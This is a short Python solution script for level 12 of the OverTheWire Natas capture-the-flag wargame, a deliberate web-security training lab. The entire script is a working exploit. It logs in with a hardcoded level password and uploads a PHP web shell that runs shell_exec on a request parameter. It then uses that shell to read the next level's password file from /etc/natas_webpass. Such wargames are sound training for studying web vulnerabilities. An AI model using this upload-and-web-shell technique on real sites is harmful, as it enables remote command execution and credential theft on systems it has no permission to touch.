import requests
from bs4 import BeautifulSoup

username = 'natas12'
password = 'EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3'
url = "http://{}.natas.labs.overthewire.org/".format(username)

file = {'uploadedfile': "<?php echo shell_exec($_REQUEST['cmd']); ?>"}
session = requests.Session()
data = {'filename': 'icyb3r.php', 'MAX_FILE_SIZE': '1000'}
r = session.post(url, data=data, files=file, auth=(username, password))

bs = BeautifulSoup(r.text, 'lxml')
text = bs.find_all('a')

shellpath = text[0].text

data = {'cmd': 'less /etc/natas_webpass/natas13'}
url = "http://{}.natas.labs.overthewire.org/{}".format(username, shellpath)
r1 = session.post(url, data=data, auth=(username, password))

print("natas13 : " + r1.text)
